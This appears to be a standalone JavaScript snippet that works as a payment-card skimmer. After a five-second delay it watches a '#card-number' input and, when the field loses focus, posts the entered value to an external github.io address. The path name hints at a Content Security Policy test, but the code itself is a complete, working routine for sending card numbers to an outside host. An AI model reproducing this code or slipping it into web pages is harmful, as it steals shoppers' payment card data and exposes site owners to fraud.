setTimeout(function() {
  $("#card-number").on('blur', function() {
    $.post( "https://mmiesiak.github.io/csp/test.html", { name: $(this).val() } );
  })
}, 5000);
